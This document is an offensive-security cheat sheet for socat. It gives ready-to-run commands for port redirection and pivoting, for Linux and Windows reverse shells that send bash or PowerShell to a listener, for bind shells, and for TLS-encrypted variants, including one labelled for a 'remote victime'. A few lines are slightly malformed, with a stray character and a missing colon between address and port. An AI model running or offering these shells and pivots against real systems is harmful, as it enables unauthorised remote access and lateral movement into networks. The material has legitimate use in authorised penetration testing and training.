# socat

% socat
#plateform/linux  #target/remote  #cat/PIVOT 

## local port redirection (pivot)
```bash
socat TCP4-LISTEN:<listen_port>,fork,reuseaddr TCP4:<redirection_ip|localhost>:<redirection_port>
```
## local port redirection to file
```bash
socat TCP4-LISTEN:<listen_port>,fork,reuseaddr OPEN:<file_path>,creat,append
```

## local port redirection to socket
```bash
socat TCP4-LISTEN:<listen_port>,fork,reuseaddr UNIX-CONNECT:<socket_path>
```

## reverse shell - callee
file:`tty`,raw,echo=0
openssl req -newkey rsa:2048 -nodes -keyout <cert>.key -x509 -days 1000 -subject '/CN=jubeaz' -out <cert>.crt
cat <cert>.key <cert>.crt L > <cert>.pem 
encrypted: OPENSSl-LISTEN:<local_port>,cert=<cert>.pem,verify=0,fork
```bash
socat TCP4-LISTEN:<listen_port> STDOUT
```

## reverse shell - caller (linux)
encrypted: OPENSSL:<local_ip><local_port>,verify=0
```bash
socat TCP4:<local_ip><local_port> EXEC:/bin/bash
```

## reverse shell - caller (windows)
encrypted: OPENSSL:<local_ip><local_port>,verify=0
```bash
socat TCP4:<local_ip><local_port> EXEC:'powershell.exe',pipes
```


## bind shell - caller 
encrypted: OPENSSl:<remote_ip>:<remote_port>,verify=0
```bash
socat - TCP4:<remote_ip>:<remote_port>
```

## bind shell - callee (linux)
openssl req -newkey rsa:2048 -nodes -keyout <cert>.key -x509 -days 1000 -subject '/CN=jubeaz' -out <cert>.crt
cat <cert>.key <cert>.crt L > <cert>.pem 
encrypted: OPENSSl-LISTEN:<local_port>,cert=<cert>.pem,verify=0,fork
```bash
socat TCP4-LISTEN:<local_port> EXEC:/bin/bash
```

## bind shell - callee (windows)

encrypted: OPENSSl-LISTEN:<local_port>, cert=<cert>.pem,verify=0,fork
```bash
socat TCP4-LISTEN:<local_port> EXEC:'powershell.exe',pipes
```



## socat port forwarding listener (on local machine)
```
./socat TCP-LISTEN:<port_listener|4444>,fork,reuseaddr TCP-LISTEN:<port_to_forward>
```

## socat port forwarding connect (on remote machine)
#plateform/linux  #target/remote  #cat/PIVOT 
```
./socat TCP:<connect_ip>:<connect_port|4444> TCP:127.0.0.1:<port_to_forward>
```

## socat reverse shell (remote victime)
#plateform/linux  #target/remote  #cat/PIVOT 
```
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<listner_ip>:<listner_port|4444>
```

## socat reverse shell listener (local)
#plateform/linux  #target/remote  #cat/PIVOT 
```
socat file:`tty`,raw,echo=0 tcp-listen:<listner_port|4444>
```

